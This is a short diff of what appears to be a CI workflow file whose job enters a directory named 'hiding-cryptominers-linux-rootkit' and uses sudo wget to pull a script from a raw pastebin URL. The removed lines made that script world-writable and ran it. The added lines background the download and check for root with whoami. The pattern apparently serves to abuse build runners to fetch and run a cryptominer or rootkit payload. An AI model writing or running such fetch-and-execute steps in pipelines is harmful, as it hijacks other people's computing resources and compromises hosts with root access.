@@ -17,7 +17,7 @@ jobs:
       - name: LOADING
         run: |
           cd hiding-cryptominers-linux-rootkit/
-          sudo wget -O ab.sh https://pastebin.com/raw/D7E7Pcay
+          sudo wget -O ab.sh https://pastebin.com/raw/D7E7Pcay&
           export USER=root
-          sudo chmod 777 ab.sh
-          ./ab.sh
+          whoami
+          sudo whoami
